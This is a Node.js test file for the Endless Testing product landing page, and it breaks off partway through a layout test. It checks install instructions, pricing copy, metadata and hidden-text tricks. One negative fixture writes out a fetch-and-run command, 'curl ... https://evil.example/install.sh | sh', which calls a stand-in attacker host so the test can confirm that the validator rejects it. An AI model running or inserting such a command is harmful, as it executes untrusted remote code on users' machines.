import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from '/home/valentin/.dev-browser/node_modules/playwright/index.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');

function newestChrome() {
  const base = '/home/valentin/.cache/ms-playwright';
  const versions = fs.readdirSync(base)
    .filter((name) => name.startsWith('chromium-'))
    .map((name) => ({ name, n: Number(name.split('-')[1]) }))
    .filter((item) => Number.isFinite(item.n))
    .sort((a, b) => b.n - a.n);
  assert.ok(versions.length > 0, 'playwright chromium is installed');
  return path.join(base, versions[0].name, 'chrome-linux64/chrome');
}

function contentType(filePath) {
  if (filePath.endsWith('.html')) return 'text/html; charset=utf-8';
  if (filePath.endsWith('.js')) return 'text/javascript; charset=utf-8';
  if (filePath.endsWith('.css')) return 'text/css; charset=utf-8';
  if (filePath.endsWith('.png')) return 'image/png';
  return 'application/octet-stream';
}

function listen() {
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    const rel = decodeURIComponent(url.pathname === '/' ? '/index.html' : url.pathname);
    const filePath = path.join(root, rel);
    if (!filePath.startsWith(root)) {
      res.writeHead(403);
      res.end('forbidden');
      return;
    }
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('not found');
        return;
      }
      res.writeHead(200, { 'content-type': contentType(filePath) });
      res.end(data);
    });
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve(server));
  });
}

function rgb(value) {
  return value.match(/\d+(\.\d+)?/g).slice(0, 3).map(Number);
}

function distance(a, b) {
  const dx = a[0] - b[0];
  const dy = a[1] - b[1];
  const dz = a[2] - b[2];
  return Math.hypot(dx, dy, dz);
}

function channel(value) {
  const c = value / 255;
  return c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
}

function contrastRatio(a, b) {
  const lum = (rgbValue) => 0.2126 * channel(rgbValue[0]) + 0.7152 * channel(rgbValue[1]) + 0.0722 * channel(rgbValue[2]);
  const [hi, lo] = lum(a) > lum(b) ? [lum(a), lum(b)] : [lum(b), lum(a)];
  return (hi + 0.05) / (lo + 0.05);
}

function primaryLinks(source) {
  const links = [];
  for (const match of source.matchAll(/<a\b([^>]*)>([\s\S]*?)<\/a>/g)) {
    const attrs = match[1];
    const classAttr = attrs.match(/\bclass="([^"]*)"/);
    if (!classAttr || !classAttr[1].split(/\s+/).includes('btn-primary')) continue;
    const hrefAttr = attrs.match(/\bhref="([^"]*)"/);
    const text = match[2].replace(/<[^>]+>/g, '').replace(/\s+/g, ' ').trim();
    links.push({ href: hrefAttr ? hrefAttr[1] : '', text });
  }
  return links;
}

function asksForOpenRouterKey(source) {
  if (/openrouter[\s_-]*api[\s_-]*keys?\b/i.test(source)) return true;
  if (/openrouter[\s_-]*keys?\b/i.test(source)) return true;
  const span = 200;
  if (new RegExp(`openrouter[\\s\\S]{0,${span}}\\bkeys?\\b`, 'i').test(source)) return true;
  if (new RegExp(`\\bkeys?\\b[\\s\\S]{0,${span}}openrouter`, 'i').test(source)) return true;
  return false;
}

function assertNoOpenRouterKey(source) {
  if (asksForOpenRouterKey(source)) assert.fail('page asks for an OpenRouter key');
}

function assertDogfoodRounds(source) {
  const match = source.match(/<p id="dogfood-note">([\s\S]*?)<\/p>/);
  if (!match) assert.fail('dogfood note missing');
  const note = match[1];
  if (!note.includes('This page runs the Endless Testing SDK.')) {
    assert.fail('dogfood note dropped the SDK line');
  }
  if (!note.includes('endlesstesting-100')) assert.fail('dogfood note missing round endlesstesting-100');
  if (!note.includes('valentinyeo-2')) assert.fail('dogfood note missing round valentinyeo-2');
  if (!note.includes('The homepage is round endlesstesting-100.')) {
    assert.fail('dogfood note does not name the homepage round');
  }
  if (!note.includes('valentinyeo.com is round valentinyeo-2.')) {
    assert.fail('dogfood note does not name the valentinyeo.com round');
  }
  if (/\bwinner\b/i.test(note)) assert.fail('dogfood note claims a winner');
}

function terminalCode(source) {
  const terminal = source.match(/id="terminal"[\s\S]*?<code>([\s\S]*?)<\/code>/);
  assert.ok(terminal, 'terminal sample missing');
  return terminal[1].replace(/<([a-zA-Z][\w:-]*)\b[^>]*\shidden\b[^>]*>[\s\S]*?<\/\1>/g, '');
}

function statusSample(source) {
  const text = terminalCode(source).replace(/<[^>]+>/g, '');
  const marker = '$ et status';
  const at = text.indexOf(marker);
  assert.notEqual(at, -1, 'et status command missing from terminal');
  const after = text.slice(at + marker.length);
  const newline = after.indexOf('\n');
  assert.notEqual(newline, -1, 'sample has no winner line');
  return after.slice(newline + 1);
}

function namesWinner(line) {
  const named = line.match(/^winner:\s+(\S(?:.*\S)?)$/i);
  if (!named) return false;
  const name = named[1].trim().toLowerCase();
  if (/^(null|none|undefined|nil|n\/a|na|false|pending|unknown|tbd|no winner|no-winner|-+|\?+)$/.test(name)) return false;
  return true;
}

function assertStatusNamesWinner(source) {
  const line = statusSample(source).split('\n').map((item) => item.trim()).find(namesWinner);
  assert.ok(line, 'sample has no winner line');
}

function assertLinesSection(source) {
  const lines = source.match(/<section id="lines">([\s\S]*?)<\/section>/);
  assert.ok(lines, 'lines section missing');
  assert.match(lines[1], /<h2>The product writes the challenger lines<\/h2>/);
  assert.match(lines[1], /You connect Claude, Codex, or ChatGPT\./);
  assert.match(lines[1], /Endless Testing writes the next lines\./);
  const connect = source.match(/<section id="connect">([\s\S]*?)<\/section>/);
  assert.ok(connect, 'connect section missing');
  assert.match(connect[1], /<h3>API<\/h3>/);
}

function assertPrimaryTrialGoal(source) {
  const links = primaryLinks(source);
  assert.ok(links.length > 0, 'index has no primary links');
  for (const link of links) {
    assert.equal(link.href, 'https://dash.endlesstesting.ai/');
    if (link.text === 'Start 7-day trial') {
      assert.fail('primary link still uses the shorter trial label');
    }
    assert.equal(link.text, 'Start 7-day free trial');
  }
}

test('primary links use Start 7-day free trial and reject the shorter label', () => {
  assertPrimaryTrialGoal(html);
  const shorter = '<a class="btn btn-primary" href="https://dash.endlesstesting.ai/">Start 7-day trial</a>';
  assert.throws(() => assertPrimaryTrialGoal(shorter), /shorter trial label/);
  const longer = '<a class="btn btn-primary" href="https://dash.endlesstesting.ai/">Start 7-day free trial</a>';
  assertPrimaryTrialGoal(longer);
  const reverted = html.replaceAll('Start 7-day free trial', 'Start 7-day trial');
  assert.notEqual(reverted, html);
  assert.throws(() => assertPrimaryTrialGoal(reverted), /shorter trial label/);
});

const INSTALL_FILES = [
  'et-x86_64-linux-musl',
  'et-aarch64-linux-musl',
  'et-x86_64-macos',
  'et-aarch64-macos',
  'et-x86_64-windows',
];

function asksForGitHubLogin(source) {
  if (/gh\s+auth\s+login/i.test(source)) return true;
  if (/\bGITHUB_TOKEN\b/.test(source)) return true;
  if (/\bGH_TOKEN\b/.test(source)) return true;
  return false;
}

function hasInstallFile(text, name) {
  return new RegExp(`(?<![A-Za-z0-9_-])${name}(?![A-Za-z0-9_-])`).test(text);
}

function decodeEntities(source) {
  let cur = source;
  for (let pass = 0; pass < 4; pass++) {
    const next = cur
      .replace(/&nbsp(?:;|(?![A-Za-z0-9]))/gi, ' ')
      .replace(/&(#x[0-9a-f]+|#\d+|sol|amp);?/gi, (entity) => {
        const token = entity.endsWith(';') ? entity.slice(0, -1) : entity;
        if (/^&sol$/i.test(token)) return '/';
        if (/^&amp$/i.test(token)) return '&';
        if (/^&#x[0-9a-f]+$/i.test(token)) {
          const cp = parseInt(token.slice(3), 16);
          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
        }
        if (/^&#\d+$/i.test(token)) {
          const cp = parseInt(token.slice(2), 10);
          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
        }
        return entity;
      });
    if (next === cur) return cur;
    cur = next;
  }
  return cur;
}

function normalizePage(source) {
  return decodeEntities(source)
    .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
    .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '');
}

function containsNeedle(source, needle) {
  const folded = normalizePage(source).toLowerCase();
  const want = needle.toLowerCase();
  if (folded.includes(want)) return true;
  if (folded.replace(/\s+/g, ' ').includes(want)) return true;
  const visible = folded
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<br\b[^>]*>/gi, ' ')
    .replace(/<[^>]+>/g, '');
  if (visible.includes(want)) return true;
  return visible.replace(/\s+/g, ' ').includes(want);
}

function containsReleaseDownload(source) {
  return containsNeedle(source, 'releases/download');
}

function containsGhReleaseDownload(source) {
  return containsNeedle(source, 'gh release download');
}

function concealedAttrs(attrs) {
  if (/(?:^|\s)hidden(?:\s|=|$)/i.test(attrs)) return true;
  const style = attrs.match(/\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
  const value = style ? (style[1] ?? style[2] ?? style[3] ?? '') : '';
  if (/display\s*:\s*none\b/i.test(value)) return true;
  if (/visibility\s*:\s*hidden\b/i.test(value)) return true;
  if (/opacity\s*:\s*0(?:\.0+)?(?![0-9.])/i.test(value)) return true;
  if (/font-size\s*:\s*0(?:\.0+)?(?![0-9.])/i.test(value)) return true;
  if (/(?<![\w-])color\s*:\s*transparent\b/i.test(value)) return true;
  if (/(?:^|[;\s])left\s*:\s*-\d{3,}px\b/i.test(value)) return true;
  if (/(?:^|[;\s])text-indent\s*:\s*-\d{3,}px\b/i.test(value)) return true;
  return false;
}

function stripConcealed(fragment) {
  const openRe = /<([a-zA-Z][\w:-]*)\b([^>]*)>/g;
  let cur = fragment;
  for (let pass = 0; pass < 20; pass++) {
    openRe.lastIndex = 0;
    let next = '';
    let cursor = 0;
    let changed = false;
    let match;
    while ((match = openRe.exec(cur))) {
      if (!concealedAttrs(match[2])) continue;
      const closeRe = new RegExp(`<(/?)${match[1]}\\b[^>]*>`, 'gi');
      closeRe.lastIndex = openRe.lastIndex;
      let depth = 1;
      let close = -1;
      let end;
      while ((end = closeRe.exec(cur))) {
        depth += end[1] === '/' ? -1 : 1;
        if (depth === 0) {
          close = closeRe.lastIndex;
          break;
        }
      }
      if (close < 0) continue;
      next += cur.slice(cursor, match.index);
      cursor = close;
      openRe.lastIndex = close;
      changed = true;
    }
    if (!changed) return cur;
    cur = next + cur.slice(cursor);
  }
  return cur;
}

function installFragment(source) {
  const clean = source.replace(/<!--[\s\S]*?-->/g, '');
  const open = /<div\b[^>]*\bid="terminal"[^>]*>/.exec(clean);
  assert.ok(open, 'install files missing beside the terminal');
  let depth = 1;
  const tagRe = /<\/?div\b[^>]*>/g;
  tagRe.lastIndex = open.index + open[0].length;
  let match;
  while ((match = tagRe.exec(clean))) {
    depth += match[0].startsWith('</') ? -1 : 1;
    if (depth === 0) {
      const sibling = clean.slice(tagRe.lastIndex).match(/^\s*<p\b([^>]*)>([\s\S]*?)<\/p>/);
      assert.ok(sibling, 'install files missing beside the terminal');
      const attrs = sibling[1];
      if (!/\bclass="[^"]*\binstall-files\b/.test(attrs) || concealedAttrs(attrs)) {
        assert.fail('install files missing beside the terminal');
      }
      return sibling[2];
    }
  }
  assert.fail('install files missing beside the terminal');
}

function installParagraph(source) {
  return normalizePage(stripConcealed(installFragment(source)).replace(/<[^>]+>/g, ''));
}

function installCommand(source) {
  const fragment = stripConcealed(installFragment(source));
  const code = fragment.match(/<code\b([^>]*)>([\s\S]*?)<\/code>/i);
  if (!code || concealedAttrs(code[1])) assert.fail('curl install line missing');
  return normalizePage(stripConcealed(code[2]).replace(/<[^>]+>/g, '')).trim();
}

const CURL_INSTALL_LINE = 'curl -fsSL https://api.endlesstesting.ai/install.sh | sh';

function assertInstallFiles(source) {
  if (asksForGitHubLogin(source)) assert.fail('command needs a GitHub login');
  if (containsReleaseDownload(source)) assert.fail('page contains releases/download');
  if (containsGhReleaseDownload(source)) assert.fail('gh release download remains');
  const text = installParagraph(source);
  if (installCommand(source) !== CURL_INSTALL_LINE) assert.fail('curl install line missing');
  for (const name of INSTALL_FILES) {
    if (!hasInstallFile(text, name)) assert.fail(`install file missing: ${name}`);
  }
  if (!/The script picks the file for this machine\./.test(text)) {
    assert.fail('install files missing the machine sentence');
  }
}

test('the page names the five et install files beside the terminal', () => {
  assertInstallFiles(html);
  for (const name of INSTALL_FILES) {
    const stripped = html.replaceAll(name, 'et-missing');
    assert.notEqual(stripped, html, name);
    assert.throws(() => assertInstallFiles(stripped), new RegExp(`install file missing: ${name}`), name);
    const longer = html.replaceAll(name, `${name}-extra`);
    assert.notEqual(longer, html, `${name} longer`);
    assert.throws(() => assertInstallFiles(longer), new RegExp(`install file missing: ${name}`), `${name} longer`);
  }

  const hiddenName = html.replace('et-x86_64-windows', '<span hidden>et-x86_64-windows</span>');
  assert.notEqual(hiddenName, html);
  assert.throws(() => assertInstallFiles(hiddenName), /install file missing: et-x86_64-windows/);

  const hiddenSentence = html.replace(
    'The script picks the file for this machine.',
    '<span hidden>The script picks the file for this machine.</span>',
  );
  assert.notEqual(hiddenSentence, html);
  assert.throws(() => assertInstallFiles(hiddenSentence), /machine sentence/);

  const paragraph = html.match(/<p class="install-files">[\s\S]*?<\/p>/)[0];
  const moved = html.replace(paragraph, '').replace('</body>', `${paragraph}</body>`);
  assert.notEqual(moved, html);
  assert.throws(() => assertInstallFiles(moved), /install files missing beside the terminal/);

  const noSentence = html.replace('The script picks the file for this machine.', 'Pick a file.');
  assert.notEqual(noSentence, html);
  assert.throws(() => assertInstallFiles(noSentence), /machine sentence/);

  const gh = html.replace('> et login', '> gh auth login');
  assert.notEqual(gh, html);
  assert.throws(() => assertInstallFiles(gh), /GitHub login/);
  assert.throws(() => assertInstallFiles(`${html}\nGITHUB_TOKEN`), /GitHub login/);
  assert.throws(() => assertInstallFiles(`${html}\nGH_TOKEN`), /GitHub login/);

  const noCmd = html.replace(CURL_INSTALL_LINE, 'curl -O et-x86_64-linux-musl');
  assert.notEqual(noCmd, html);
  assert.throws(() => assertInstallFiles(noCmd), /curl install line missing/);

  const hiddenCmd = html.replace(
    CURL_INSTALL_LINE,
    `<span hidden>${CURL_INSTALL_LINE}</span>`,
  );
  assert.notEqual(hiddenCmd, html);
  assert.throws(() => assertInstallFiles(hiddenCmd), /curl install line missing/);

  const leaked = html.replace('</body>', '<!-- releases/download --></body>');
  assert.notEqual(leaked, html);
  assert.throws(() => assertInstallFiles(leaked), /page contains releases\/download/);

  const urlLine = html.replace(
    CURL_INSTALL_LINE,
    'https://github.com/valentinyeo/endless-testing/releases/download/et/et-x86_64-linux-musl',
  );
  assert.notEqual(urlLine, html);
  assert.throws(() => assertInstallFiles(urlLine), /page contains releases\/download/);

  const oldCmd = html.replace(
    CURL_INSTALL_LINE,
    'gh release download et --repo valentinyeo/endless-testing --pattern et-x86_64-linux-musl',
  );
  assert.notEqual(oldCmd, html);
  assert.throws(() => assertInstallFiles(oldCmd), /gh release download remains/);

  const keptCmd = html.replace('</body>', 'gh release download</body>');
  assert.notEqual(keptCmd, html);
  assert.throws(() => assertInstallFiles(keptCmd), /gh release download remains/);

  const hiddenCmdCase = html.replace(
    CURL_INSTALL_LINE,
    `<span Hidden>${CURL_INSTALL_LINE}</span>`,
  );
  assert.notEqual(hiddenCmdCase, html);
  assert.throws(() => assertInstallFiles(hiddenCmdCase), /curl install line missing/);

  const hiddenParagraph = html.replace('<p class="install-files">', '<p Hidden class="install-files">');
  assert.notEqual(hiddenParagraph, html);
  assert.throws(() => assertInstallFiles(hiddenParagraph), /install files missing beside the terminal/);

  const noneCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="display:none">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(noneCmd, html);
  assert.throws(() => assertInstallFiles(noneCmd), /curl install line missing/);

  const wrongHost = html.replace('https://api.endlesstesting.ai/install.sh', 'https://api.endlesstesting.ai/install.txt');
  assert.notEqual(wrongHost, html);
  assert.throws(() => assertInstallFiles(wrongHost), /curl install line missing/);

  const entityUrl = html.replace('</body>', '<!-- releases&#47;download --></body>');
  assert.notEqual(entityUrl, html);
  assert.throws(() => assertInstallFiles(entityUrl), /page contains releases\/download/);

  const namedUrl = html.replace('</body>', 'releases&sol;download</body>');
  assert.notEqual(namedUrl, html);
  assert.throws(() => assertInstallFiles(namedUrl), /page contains releases\/download/);

  const splitUrl = html.replace('</body>', '<p>releases/<span>download</span></p></body>');
  assert.notEqual(splitUrl, html);
  assert.throws(() => assertInstallFiles(splitUrl), /page contains releases\/download/);

  const zwUrl = html.replace('</body>', 'releases/\u200bdownload</body>');
  assert.notEqual(zwUrl, html);
  assert.throws(() => assertInstallFiles(zwUrl), /page contains releases\/download/);

  const nbspGh = html.replace('</body>', 'gh&nbsp;release&nbsp;download</body>');
  assert.notEqual(nbspGh, html);
  assert.throws(() => assertInstallFiles(nbspGh), /gh release download remains/);

  const numNbspGh = html.replace('</body>', 'gh&#160;release&#160;download</body>');
  assert.notEqual(numNbspGh, html);
  assert.throws(() => assertInstallFiles(numNbspGh), /gh release download remains/);

  const hexNbspGh = html.replace('</body>', 'gh&#xa0;release&#xa0;download</body>');
  assert.notEqual(hexNbspGh, html);
  assert.throws(() => assertInstallFiles(hexNbspGh), /gh release download remains/);

  const literalNbspGh = html.replace('</body>', 'gh\u00A0release\u00A0download</body>');
  assert.notEqual(literalNbspGh, html);
  assert.throws(() => assertInstallFiles(literalNbspGh), /gh release download remains/);

  const ampNbspGh = html.replace('</body>', 'gh&amp;nbsp;release&amp;nbsp;download</body>');
  assert.notEqual(ampNbspGh, html);
  assert.throws(() => assertInstallFiles(ampNbspGh), /gh release download remains/);

  const ampSol = html.replace('</body>', 'releases&amp;sol;download</body>');
  assert.notEqual(ampSol, html);
  assert.throws(() => assertInstallFiles(ampSol), /page contains releases\/download/);

  const upperGh = html.replace('</body>', 'GH release download</body>');
  assert.notEqual(upperGh, html);
  assert.throws(() => assertInstallFiles(upperGh), /gh release download remains/);

  const spacedGh = html.replace('</body>', 'gh  release  download</body>');
  assert.notEqual(spacedGh, html);
  assert.throws(() => assertInstallFiles(spacedGh), /gh release download remains/);

  const tabGh = html.replace('</body>', 'gh\trelease\tdownload</body>');
  assert.notEqual(tabGh, html);
  assert.throws(() => assertInstallFiles(tabGh), /gh release download remains/);

  const newlineGh = html.replace('</body>', '<!-- gh\nrelease download --></body>');
  assert.notEqual(newlineGh, html);
  assert.throws(() => assertInstallFiles(newlineGh), /gh release download remains/);

  const brGh = html.replace('</body>', '<p>gh<br>release download</p></body>');
  assert.notEqual(brGh, html);
  assert.throws(() => assertInstallFiles(brGh), /gh release download remains/);

  const upperUrl = html.replace('</body>', 'Releases/Download</body>');
  assert.notEqual(upperUrl, html);
  assert.throws(() => assertInstallFiles(upperUrl), /page contains releases\/download/);

  const commentSplit = html.replace('</body>', 'releases/<!-- > -->download</body>');
  assert.notEqual(commentSplit, html);
  assert.throws(() => assertInstallFiles(commentSplit), /page contains releases\/download/);

  const suffix = html.replace(CURL_INSTALL_LINE, `${CURL_INSTALL_LINE} --help`);
  assert.notEqual(suffix, html);
  assert.throws(() => assertInstallFiles(suffix), /curl install line missing/);

  const wrongCode = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code>curl -fsSL https://evil.example/install.sh | sh</code> ${CURL_INSTALL_LINE}`,
  );
  assert.notEqual(wrongCode, html);
  assert.throws(() => assertInstallFiles(wrongCode), /curl install line missing/);

  const opacityCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="opacity:0">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(opacityCmd, html);
  assert.throws(() => assertInstallFiles(opacityCmd), /curl install line missing/);

  const tinyCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="font-size:0">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(tinyCmd, html);
  assert.throws(() => assertInstallFiles(tinyCmd), /curl install line missing/);

  const clearCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="color:transparent">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(clearCmd, html);
  assert.throws(() => assertInstallFiles(clearCmd), /curl install line missing/);

  const offscreenCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="position:absolute;left:-9999px">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(offscreenCmd, html);
  assert.throws(() => assertInstallFiles(offscreenCmd), /curl install line missing/);

  const fadedName = html.replace(
    'et-x86_64-macos',
    '<span style="opacity:0">et-x86_64-macos</span>',
  );
  assert.notEqual(fadedName, html);
  assert.throws(() => assertInstallFiles(fadedName), /install file missing: et-x86_64-macos/);
});

test('the page does not ask for an OpenRouter key', () => {
  assertNoOpenRouterKey(html);
  assert.throws(() => assertNoOpenRouterKey('Paste your OpenRouter key'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Add your OpenRouter API key'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Paste your API key from OpenRouter'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Enter your key for OpenRouter'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('API key (OpenRouter)'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Go to OpenRouter, create an account, open settings, and copy the API key.'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('OPENROUTER_API_KEY'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('OPENROUTER_KEY'), /OpenRouter key/);
  assertNoOpenRouterKey('Traffic is not sent to OpenRouter.');
  assertNoOpenRouterKey('OpenRouter keyboard');
  const far = `Traffic is not sent to OpenRouter.${' '.repeat(400)}if (event.key === 'Escape') closeMenu();`;
  assertNoOpenRouterKey(far);
});

test('the et status sample names a winner', () => {
  assertStatusNamesWinner(html);
  const stripped = html.replace('winner: Clear price', 'round: 2');
  assert.notEqual(stripped, html);
  assert.throws(() => assertStatusNamesWinner(stripped), /sample has no winner line/);
  const unnamed = html.replace('winner: Clear price', 'winner:');
  assert.throws(() => assertStatusNamesWinner(unnamed), /sample has no winner line/);
  const blank = html.replace('winner: Clear price', '');
  assert.throws(() => assertStatusNamesWinner(blank), /sample has no winner line/);

  for (const fake of ['null', 'none', 'undefined', 'nil', 'n/a', 'na', 'false', 'pending', 'unknown', 'TBD', 'no winner', 'no-winner', '-', '?']) {
    const sample = html.replace('winner: Clear price', `winner: ${fake}`);
    assert.notEqual(sample, html, fake);
    assert.throws(() => assertStatusNamesWinner(sample), /sample has no winner line/, fake);
  }

  const sameLine = html.replace('\n<span class="dim">winner: Clear price</span>', ' winner: Clear price');
  assert.notEqual(sameLine, html);
  assert.throws(() => assertStatusNamesWinner(sameLine), /sample has no winner line/);

  const before = html
    .replace('<span class="dim">winner: Clear price</span>', '')
    .replace('$ et status', 'winner: Clear price\n$ et status');
  assert.throws(() => assertStatusNamesWinner(before), /sample has no winner line/);

  const outside = html
    .replace('<span class="dim">winner: Clear price</span>', '')
    .replace('</body>', '<p>winner: Clear price</p></body>');
  assert.throws(() => assertStatusNamesWinner(outside), /sample has no winner line/);

  const hidden = html.replace('<span class="dim">', '<span class="dim" hidden>');
  assert.notEqual(hidden, html);
  assert.throws(() => assertStatusNamesWinner(hidden), /sample has no winner line/);

  const comment = html.replace('<span class="dim">winner: Clear price</span>', '<!-- winner: Clear price -->');
  assert.throws(() => assertStatusNamesWinner(comment), /sample has no winner line/);
});

test('you connect Claude, Codex, or ChatGPT and the product writes the next lines', () => {
  assertLinesSection(html);
  const stripped = html.replace(/<section id="lines">[\s\S]*?<\/section>/, '');
  assert.notEqual(stripped, html);
  assert.throws(() => assertLinesSection(stripped), /lines section missing/);
  const noConnect = html.replace('You connect Claude, Codex, or ChatGPT.', 'You bring a model.');
  assert.notEqual(noConnect, html);
  assert.throws(() => assertLinesSection(noConnect), /Claude, Codex, or ChatGPT/);
  const noLines = html.replace('Endless Testing writes the next lines.', 'Endless Testing stores the round.');
  assert.notEqual(noLines, html);
  assert.throws(() => assertLinesSection(noLines), /writes the next lines/);
});

test('landing copy has the required facts and no em dashes', () => {
  assert.equal(html.includes('\u2014'), false);
  assert.equal(html.includes('\u2013'), false);
  assert.match(html, /id="primary-cta"[^>]*href="https:\/\/dash\.endlesstesting\.ai\/"/);
  assert.match(html, /et login/);
  assert.match(html, /et site add/);
  assert.match(html, /et round start/);
  assert.match(html, /et status/);
  assert.match(html, /The winner stays live/);
  assert.match(html, /The next round starts itself/);
  assert.match(html, /CLI, MCP, and API are equal/);
  assert.match(html, /The kill switch stops the round/);
  assert.match(html, /id="price-amount">\$299</);
  assert.match(html, /\$249\/mo/);
  assert.match(html, /7-day free trial/);
  assert.match(html, /id="dogfood-note">This page runs the Endless Testing SDK\./);
  assert.match(html, /src="https:\/\/api\.endlesstesting\.ai\/api\/sdk\.js" async data-cfasync="false"/);
  assert.match(html, /base: "https:\/\/api\.endlesstesting\.ai"/);
  const billed = html.match(/Billed annually at <strong>\$([\d,]+)\/yr<\/strong>/);
  assert.ok(billed, 'annual total missing from billing script');
  assert.equal(Number(billed[1].replaceAll(',', '')), 249 * 12);
  const save = html.match(/Save \$(\d+)\/yr/);
  assert.ok(save, 'annual savings missing from billing script');
  assert.equal(Number(save[1]), (299 - 249) * 12);
  assert.match(html, /rel="icon" href="\/images\/icon\.png"/);
  assert.equal(fs.existsSync(path.join(root, 'images/icon.png')), true);
});

test('dogfood note names the two live rounds', () => {
  assertDogfoodRounds(html);
  const noteMatch = html.match(/<p id="dogfood-note">([\s\S]*?)<\/p>/);
  assert.ok(noteMatch, 'dogfood note missing');
  const tagged = noteMatch[0];
  const note = noteMatch[1];
  const dropHome = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('endlesstesting-100', 'gone-home') + '</p><p>endlesstesting-100</p>',
  );
  assert.throws(() => assertDogfoodRounds(dropHome), /endlesstesting-100/);
  const dropSite = html.replace(
    tagged,
    '<p id="dogfood-note">' + note.replace('valentinyeo-2', 'gone-site') + '</p><p>valentinyeo-2</p>',
  );
  assert.throws(() => assertDogfoodRounds(dropSite), /valentinyeo-2/);
  const claim = html.replace(tagged, '<p id="dogfood-note">' + note + ' The winner is the homepage.</p>');
  assert.throws(() => assertDogfoodRounds(claim), /winner/);
});

test('agent files and share metadata are on the page', () => {
  assert.match(html, /rel="canonical" href="https:\/\/endlesstesting\.ai\/"/);
  assert.match(html, /property="og:image" content="https:\/\/endlesstesting\.ai\/og\.png"/);
  assert.match(html, /property="og:image:width" content="1200"/);
  assert.match(html, /property="og:image:height" content="630"/);
  assert.match(html, /name="twitter:card" content="summary_large_image"/);
  assert.match(html, /name="twitter:image" content="https:\/\/endlesstesting\.ai\/og\.png"/);
  const json = html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
  assert.ok(json, 'JSON-LD missing');
  const data = JSON.parse(json[1]);
  assert.equal(data['@type'], 'SoftwareApplication');
  assert.equal(data.url, 'https://endlesstesting.ai/');
  assert.equal(data.offers.price, '299');
  assert.equal(data.offers.priceCurrency, 'USD');
  const llms = fs.readFileSync(path.join(root, 'llms.txt'), 'utf8');
  const full = fs.readFileSync(path.join(root, 'llms-full.txt'), 'utf8');
  const script = 'src="https://api.endlesstesting.ai/api/sdk.js" async data-cfasync="false"';
  for (const text of [llms, full]) {
    assert.equal(text.includes('\u2014'), false);
    assert.equal(text.includes('\u2013'), false);
    assert.match(text, /et login/);
    assert.match(text, /et mcp/);
    assert.ok(text.includes('data-cfasync="false"'));
    assert.match(text, /blockUntilVariants/);
  }
  assert.match(full, /The SDK blocks rendering when `blockUntilVariants` is omitted/);
  assert.ok(full.includes(script));
  const robots = fs.readFileSync(path.join(root, 'robots.txt'), 'utf8');
  const sitemap = fs.readFileSync(path.join(root, 'sitemap.xml'), 'utf8');
  assert.match(robots, /Sitemap: https:\/\/endlesstesting\.ai\/sitemap\.xml/);
  assert.match(sitemap, /<loc>https:\/\/endlesstesting\.ai\/<\/loc>/);
  assert.equal(sitemap.includes('ads.html'), false);
  const png = fs.readFileSync(path.join(root, 'og.png'));
  assert.deepEqual([...png.subarray(0, 8)], [137, 80, 78, 71, 13, 10, 26, 10]);
  assert.equal(png.subarray(12, 16).toString('ascii'), 'IHDR');
  assert.equal(png.readUInt32BE(16), 1200);
  assert.equal(png.readUInt32BE(20), 630);
});

describe('landing layout', () => {
  let server;
  let browser;
  let page;
  let base;

  before(async () => {
    server = await listen();
    base = `http://127.0.0.1:${server.address().port}/`;
    browser = await chromium.launch({ executablePath: newestChrome() });
    page = await browser.newPage();
  });

  after(async () => {
    await browser.close();
    await new Promise((resolve) => server.close(resolve));
  });

  async function open() {
    await page.goto(base, { waitUntil: 'networkidle' });
    await page.evaluate(() => document.fonts.ready);
  }

  test('wordmark is one word, anchors clear the header, and 375 does not scroll sideways', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();

    const logoBox = await page.evaluate(() => {
      const logo = document.querySelector('.logo');
      const text = [...logo.childNodes].find((node) => node.nodeType === Node.TEXT_NODE);
      const range = document.createRange();
      range.selectNodeContents(text);
      const textBox = range.getBoundingClientRect();
      const mark = logo.querySelector('span').getBoundingClientRect();
      return {
        gap: mark.left - textBox.right,
        line: Math.abs(mark.top - textBox.top),
      };
    });
    assert.ok(logoBox.gap < 2 && logoBox.gap > -0.5, `logo gap is ${logoBox.gap}px`);
    assert.ok(logoBox.line < 2, `logo wraps, line delta ${logoBox.line}px`);

    const narrow = await page.evaluate(() => ({
